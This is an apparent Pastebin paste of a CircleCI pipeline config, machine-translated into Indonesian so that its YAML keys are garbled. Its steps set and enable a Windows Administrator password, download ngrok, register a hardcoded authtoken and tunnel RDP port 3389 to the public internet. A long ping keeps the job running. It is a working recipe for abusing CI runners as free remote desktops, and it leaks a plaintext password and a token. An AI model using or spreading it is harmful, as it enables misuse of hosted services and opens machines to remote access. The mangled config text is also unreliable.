@@ -1,0 +1,32 @@
+      tempel
+
+Pengguna Tamu
+SEORANG TAMU
+15 MARET 2021
+3,593
+TIDAK PERNAH
+Belum menjadi anggota Pastebin? Daftar , itu membuka banyak fitur keren!
+0,79 KB
+  
+versi: 2.1 
+ 
+bola:
+  menang: circleci/windows@2.2.0
+ 
+pekerjaan:
+  membangun: 
+    pelaksana:
+      nama: menang/default 
+      ukuran: "sedang" 
+ 
+    Langkah:
+      - Periksa      
+-jalankan       : Set - LocalUser -Nama "Administrator" -Password (ConvertTo-SecureString -AsPlainText " SUKakarya25@#$" -Force)
+-jalankan       : Get - LocalUser -Nama "Administrator" | Indah-Pengguna Lokal
+-jalankan       : Invoke-WebRequest https : //bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+      - jalankan: tar xf ngrok.zip
+      - jalankan: Salin ngrok.exe C:\Windows\System32
+      - jalankan: cmd /c echo ./ngrok.exe authtoken "24KQaSS6CZO0SgBrIgxrqoPbO3y_68YordoMX8jMwT92Tqr7p" >a.ps1
+      - jalankan: cmd /c echo cmd /k start ngrok.exe tcp 3389 >>a.ps1
+      - jalankan: cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+      - jalankan: .\a.ps1
